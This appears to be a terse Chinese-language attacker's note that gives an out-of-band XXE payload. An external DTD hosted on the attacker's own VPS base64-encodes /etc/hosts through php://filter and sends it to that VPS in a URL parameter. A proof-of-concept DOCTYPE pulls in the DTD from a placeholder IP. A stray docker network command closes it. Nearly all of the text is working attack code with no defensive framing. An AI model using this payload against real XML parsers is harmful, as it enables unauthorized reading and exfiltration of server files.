## payload 
在vps上的 xxe.dtd
```xml
<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hosts">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://我的VPS地址/?p=%payl;'>">
```
poc：
```xml
<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://xxx.xxx.xxx.xxx/xxe.dtd">%remote;%int;%trick;]>
```
docker network create --subnet=172.20.0.0/24 docker-br0